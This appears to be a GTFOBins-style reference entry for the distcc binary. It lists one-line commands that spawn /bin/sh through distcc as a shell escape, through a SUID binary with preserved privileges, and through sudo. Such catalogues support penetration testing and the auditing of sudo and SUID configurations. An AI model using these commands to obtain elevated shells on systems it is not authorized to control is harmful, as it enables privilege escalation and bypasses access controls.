---
functions:
  shell:
    - code: distcc /bin/sh
  suid:
    - code: ./distcc /bin/sh -p
  sudo:
    - code: sudo distcc /bin/sh
---
